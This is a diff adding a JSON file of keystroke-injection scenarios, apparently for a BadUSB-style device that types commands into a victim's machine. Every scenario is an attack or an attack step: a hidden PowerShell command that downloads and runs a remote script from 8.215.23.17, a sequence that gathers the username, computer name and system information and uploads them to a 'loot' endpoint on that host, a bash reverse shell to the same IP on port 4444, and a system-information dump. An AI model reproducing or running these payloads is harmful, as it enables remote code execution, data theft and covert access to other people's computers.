@@ -1,0 +1,38 @@
+{
+    "scenarios": {
+        "Windows_Quick_Bypass": [
+            "GUI r",
+            "DELAY 200",
+            "STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://8.215.23.17/payload.ps1')\"",
+            "ENTER"
+        ],
+        "Windows_Cred_Harvest": [
+            "GUI r",
+            "DELAY 200",
+            "STRING cmd /c \"echo %username%:%computername% > %temp%\\intel.txt & systeminfo >> %temp%\\intel.txt\"",
+            "ENTER",
+            "DELAY 500",
+            "GUI r",
+            "DELAY 200",
+            "STRING powershell -Command \"Invoke-RestMethod -Uri http://8.215.23.17/api/loot/upload -Method Post -InFile $env:temp\\intel.txt\"",
+            "ENTER"
+        ],
+        "Linux_Reverse_Shell": [
+            "CTRL ALT t",
+            "DELAY 500",
+            "STRING bash -i >& /dev/tcp/8.215.23.17/4444 0>&1",
+            "ENTER"
+        ],
+        "System_Recon": [
+            "GUI r",
+            "DELAY 200",
+            "STRING msinfo32",
+            "ENTER",
+            "DELAY 1000",
+            "CTRL s",
+            "DELAY 500",
+            "STRING %temp%\\sysinfo.txt",
+            "ENTER"
+        ]
+    }
+}
